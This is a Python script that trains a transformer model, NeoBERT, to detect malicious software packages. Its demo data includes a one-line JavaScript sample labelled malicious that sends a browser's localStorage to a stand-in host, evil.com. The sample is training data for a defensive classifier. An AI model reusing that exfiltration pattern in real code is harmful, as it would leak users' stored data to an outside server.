#!/usr/bin/env python3
"""
NeoBERT Training Pipeline
Train NeoBERT transformer model for malicious package detection.
"""

import argparse
import logging
import os
import pickle
from pathlib import Path
import torch
import sys

# Add project root to path
sys.path.append(str(Path(__file__).parent))

from neobert.config import create_default_config, save_config_to_json, load_config_from_json
from neobert.model import create_neobert_model
from neobert.trainer import NeoBERTTrainer, PackageUnit
from neobert.evaluator import NeoBERTEvaluator

logger = logging.getLogger(__name__)


def setup_logging(log_level: str = "INFO"):
    """Setup logging configuration."""
    
    # Create logs directory
    Path("logs/neobert").mkdir(parents=True, exist_ok=True)
    
    # Configure logging
    logging.basicConfig(
        level=getattr(logging, log_level.upper()),
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(f"logs/neobert/training.log"),
            logging.StreamHandler()
        ]
    )


def create_sample_data():
    """Create sample training data for demonstration."""
    
    logger.info("Creating sample training data...")
    
    # Sample benign package unit
    benign_sample = PackageUnit(
        unit_id="benign_utils_1",
        unit_name="isValid",
        unit_type="function",
        source_file="src/utils.js",
        raw_content="function isValid(input) { return input != null && input.length > 0; }"
    )

    # Sample malicious package unit
    malicious_sample = PackageUnit(
        unit_id="malicious_stealer_1",
        unit_name="stealData",
        unit_type="function",
        source_file="src/stealer.js",
        raw_content="function stealData() { fetch('http://evil.com/steal', {method: 'POST', body: localStorage}); }"
    )
    
    # Create minimal dataset
    train_samples = [benign_sample] * 100 + [malicious_sample] * 20
    val_samples = [benign_sample] * 20 + [malicious_sample] * 4
    
    return train_samples, val_samples


def load_training_data(data_path: str = None):
    """Load training data from files or create sample data."""
    
    if data_path and Path(data_path).exists():
        logger.info(f"Loading training data from {data_path}")
        
        with open(f"{data_path}/train_units.pkl", "rb") as f:
            train_samples = pickle.load(f)
        
        with open(f"{data_path}/val_units.pkl", "rb") as f:
            val_samples = pickle.load(f)
            
        logger.info(f"Loaded {len(train_samples)} train, {len(val_samples)} val samples")
        
    else:
        logger.warning("No data path provided, creating sample data for demonstration")
        train_samples, val_samples = create_sample_data()
    
    return train_samples, val_samples


def train_neobert_model(config=None, data_path=None, batch_size=8, learning_rate=5e-5,
                       max_length=512, pooling_strategy="attention", device="auto",
                       log_level="INFO", save_dir="checkpoints/neobert", resume=None):
    """Train NeoBERT model programmatically."""

    # Setup logging
    setup_logging(log_level)
    logger.info("🎯 Starting NeoBERT training...")

    # Load or create configuration
    if config and Path(config).exists():
        logger.info(f"Loading config from {config}")
        neobert_config, training_config, eval_config = load_config_from_json(config)
    else:
        logger.info("Using default configuration")
        neobert_config, training_config, eval_config = create_default_config()

    # Override config with parameters
    if batch_size != 8:
        training_config.batch_size = batch_size
    if learning_rate != 5e-5:
        training_config.learning_rate = learning_rate
    if max_length != 512:
        neobert_config.max_length = max_length
    if pooling_strategy != "attention":
        neobert_config.pooling_strategy = pooling_strategy

    # Setup device
    if device == "auto":
        device = "cuda" if torch.cuda.is_available() else "cpu"

    logger.info(f"Using device: {device}")

    # Create save directory
    os.makedirs(save_dir, exist_ok=True)

    # Save configuration
    config_path = os.path.join(save_dir, "config.json")
    save_config_to_json(neobert_config, training_config, eval_config, config_path)
    logger.info(f"Saved config to {config_path}")

    # Load training data
    try:
        train_samples, val_samples = load_training_data(data_path)
    except Exception as e:
        logger.error(f"Failed to load training data: {e}")
        logger.info("Creating minimal sample data for testing...")
        train_samples, val_samples = create_sample_data()

    # Create model
    logger.info("Creating NeoBERT model...")
    model = create_neobert_model(neobert_config, device)
    logger.info(f"Model created with {sum(p.numel() for p in model.parameters()):,} parameters")

    # Create trainer
    trainer = NeoBERTTrainer(model, training_config, neobert_config)

    # Resume from checkpoint if specified
    if resume and Path(resume).exists():
        logger.info(f"Resuming from checkpoint: {resume}")
        trainer.load_checkpoint(resume)

    # Start training
    logger.info("Starting NeoBERT training with progressive curriculum...")
    logger.info(f"Training samples: {len(train_samples)}")
    logger.info(f"Validation samples: {len(val_samples)}")
    logger.info(f"Pooling strategy: {neobert_config.pooling_strategy}")

    try:
        results = trainer.train(train_samples, val_samples)

        # Save results
        results_path = os.path.join(save_dir, "training_results.json")
        import json
        with open(results_path, "w") as f:
            json.dump(results, f, indent=2, default=str)

        logger.info("✅ NeoBERT training completed successfully!")
        logger.info(f"Results saved to {results_path}")
        logger.info(f"Final model saved to {results.get('best_model_path', 'checkpoints/')}")

        # Quick evaluation
        if val_samples:
            logger.info("Running quick evaluation...")
            evaluator = NeoBERTEvaluator(model, eval_config, neobert_config)
            eval_results = evaluator.evaluate_classification(val_samples[:50])  # Quick eval

            logger.info(f"Validation AUC: {eval_results.get('roc_auc', 0.0):.3f}")
            logger.info(f"Validation F1: {eval_results.get('f1_score', 0.0):.3f}")

        logger.info("🎉 NeoBERT training pipeline completed!")
        return results

    except Exception as e:
        logger.error(f"Training failed: {e}")
        import traceback
        traceback.print_exc()
        raise


def main():
    """Main training function with argparse."""

    parser = argparse.ArgumentParser(description="Train NeoBERT model")
    parser.add_argument("--config", type=str, help="Path to config file")
    parser.add_argument("--data-path", type=str, help="Path to training data directory")
    parser.add_argument("--batch-size", type=int, default=8, help="Batch size")
    parser.add_argument("--learning-rate", type=float, default=5e-5, help="Learning rate")
    parser.add_argument("--max-length", type=int, default=512, help="Max sequence length")
    parser.add_argument("--pooling-strategy", type=str, default="attention",
                       choices=["mean", "attention", "mil"], help="Pooling strategy")
    parser.add_argument("--device", type=str, default="auto", help="Device (auto/cpu/cuda)")
    parser.add_argument("--log-level", type=str, default="INFO", help="Logging level")
    parser.add_argument("--save-dir", type=str, default="checkpoints/neobert", help="Save directory")
    parser.add_argument("--resume", type=str, help="Resume from checkpoint")

    args = parser.parse_args()

    # Call the programmatic function
    try:
        train_neobert_model(
            config=args.config,
            data_path=args.data_path,
            batch_size=args.batch_size,
            learning_rate=args.learning_rate,
            max_length=args.max_length,
            pooling_strategy=args.pooling_strategy,
            device=args.device,
            log_level=args.log_level,
            save_dir=args.save_dir,
            resume=args.resume
        )
    except Exception as e:
        logger.error(f"Training failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()